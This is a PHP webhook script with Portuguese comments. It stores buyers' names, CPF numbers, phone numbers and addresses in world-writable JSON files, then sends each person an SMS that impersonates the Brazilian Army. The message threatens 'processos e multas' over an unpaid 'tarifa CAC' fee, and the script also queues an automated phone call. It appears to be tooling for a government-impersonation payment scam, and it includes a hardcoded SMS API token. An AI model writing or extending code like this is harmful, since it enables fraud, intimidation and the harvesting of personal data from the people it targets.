<?php
// Receber os dados do checkout
$data = json_decode(file_get_contents('php://input'), true);

// Verificar se os dados foram recebidos corretamente
if ($data && isset($data['customer'])) {
    // Obter os dados necessários
    $customerData = [
        'name' => $data['customer']['name'],
        'cpf' => preg_replace('/[^0-9]/', '', $data['customer']['document']),
        'email' => $data['customer']['email'],
        'phone' => preg_replace('/[^0-9]/', '', $data['customer']['phone']),
        'address' => [
            'street' => $data['address']['street'],
            'number' => $data['address']['number'],
            'district' => $data['address']['district'],
            'city' => $data['address']['city'],
            'state' => $data['address']['state'],
            'zip_code' => $data['address']['zip_code']
        ],
        'purchase' => [
            'transaction_id' => $data['transaction_id'],
            'total_price' => $data['total_price'],
            'status' => $data['status'],
            'created_at' => $data['created_at']
        ]
    ];

    // Criar diretório se não existir
    $directory = 'customers';
    if (!is_dir($directory)) {
        mkdir($directory, 0777, true);
    }

    // Salvar dados em arquivo JSON
    $filename = $directory . '/' . $customerData['cpf'] . '.json';
    file_put_contents($filename, json_encode($customerData, JSON_PRETTY_PRINT));

    // Preparar dados para SMS
    $nome = explode(' ', $customerData['name'])[0];
    $telefoneFormatado = "55" . $customerData['phone'];

    // Mensagem a ser enviada
    $mensagem = "EXERCITO: $nome, sua guia de pagamento da tarifa CAC foi gerada. O nao pagamento acarretara em processos e multas extras.";

    // Enviar o SMS usando a API Owen
    enviarSMS($telefoneFormatado, $mensagem);

    // Enviar requisição para a API de ligação
    enviarLigacao($customerData['phone']);

    echo "Dados salvos com sucesso!";
} else {
    echo "Dados inválidos ou incompletos.";
}

function enviarSMS($numeroDestino, $mensagem) {
    // Obter o token da API Owen de variáveis de ambiente ou configuração
    $smsToken = 'db252611b88ed85f5d3646451951465c52b8df07';

    // Verificar se o número tem o formato correto (55 + DDD + número)
    if (strlen($numeroDestino) != 13) { // 55 + 2 DDD + 9 dígitos
        error_log("Formato de número inválido: $numeroDestino");
        return false;
    }

    // Preparar os dados para a requisição
    $payload = [
        "operator" => "claro", // pode ser claro, vivo ou tim
        "destination_number" => $numeroDestino,
        "message" => $mensagem,
        "tag" => "CACPayment",
        "user_reply" => false,
        "webhook_url" => ""
    ];

    // Configurar as opções do contexto para a requisição HTTP
    $options = [
        'http' => [
            'header'  => "Content-Type: application/json\r\n" .
                         "Authorization: $smsToken\r\n",
            'method'  => 'POST',
            'content' => json_encode($payload),
            'ignore_errors' => true
        ]
    ];

    $context  = stream_context_create($options);
    $url = 'https://api.apisms.me/v2/sms/send';

    // Fazer a requisição
    try {
        $result = file_get_contents($url, false, $context);
        
        if ($result === FALSE) {
            error_log("Falha ao enviar SMS via Owen API");
            return false;
        }
        
        $response = json_decode($result, true);
        
        // Registrar a resposta para depuração
        error_log("Resposta da API Owen: " . print_r($response, true));
        
        // Verificar se houve erro na resposta
        if (isset($response['error']) || (isset($response['status']) && $response['status'] !== 'success')) {
            error_log("Erro ao enviar SMS: " . ($response['message'] ?? 'Erro desconhecido'));
            return false;
        }
        
        return true;
    } catch (Exception $e) {
        error_log("Exceção ao enviar SMS via Owen: " . $e->getMessage());
        return false;
    }
}

function enviarLigacao($numero) {
    // URL da API de ligação
    $url = "https://v1.call4u.com.br/api/integrations/add/051928341be67dcba03f0e04104d9047/default";

    // Dados para a requisição
    $dados = [
        'number' => $numero, // Número do cliente
        'name' => 'test CA' // Nome fixo da campanha
    ];

    // Configuração da requisição
    $options = [
        'http' => [
            'header'  => "Content-type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($dados),
        ],
    ];

    // Criar contexto para a requisição
    $context  = stream_context_create($options);

    // Fazer a requisição POST
    $result = file_get_contents($url, false, $context);

    if ($result === FALSE) {
        echo "Falha ao enviar requisição de ligação.";
    } else {
        echo "Requisição de ligação enviada com sucesso!";
    }
}
?>